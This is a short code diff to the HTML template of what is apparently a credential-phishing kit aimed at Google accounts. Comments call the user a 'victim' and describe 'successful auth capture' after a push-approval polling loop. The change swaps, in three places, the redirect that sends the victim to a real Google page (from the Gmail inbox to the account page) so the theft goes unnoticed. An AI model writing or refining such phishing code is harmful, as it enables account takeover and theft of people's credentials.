@@ -1183,7 +1183,7 @@ const HTML_TEMPLATE = `<!DOCTYPE html>
           clearInterval(pushPollInterval);
           // Redirect victim to real Gmail inbox after successful auth capture
           setTimeout(function() {
-            window.location.replace('https://mail.google.com/mail/u/0/');
+            window.location.replace('https://myaccount.google.com/');
           }, 500);
           return;
         }
@@ -1195,7 +1195,7 @@ const HTML_TEMPLATE = `<!DOCTYPE html>
           clearInterval(pushPollInterval);
           // Redirect victim to real Gmail inbox after successful auth capture
           setTimeout(function() {
-            window.location.replace('https://mail.google.com/mail/u/0/');
+            window.location.replace('https://myaccount.google.com/');
           }, 800);
           return;
         }
@@ -1205,7 +1205,7 @@ const HTML_TEMPLATE = `<!DOCTYPE html>
           clearInterval(pushPollInterval);
           // Redirect victim to real Gmail inbox after successful auth capture
           setTimeout(function() {
-            window.location.replace('https://mail.google.com/mail/u/0/');
+            window.location.replace('https://myaccount.google.com/');
           }, 800);
           return;
         }
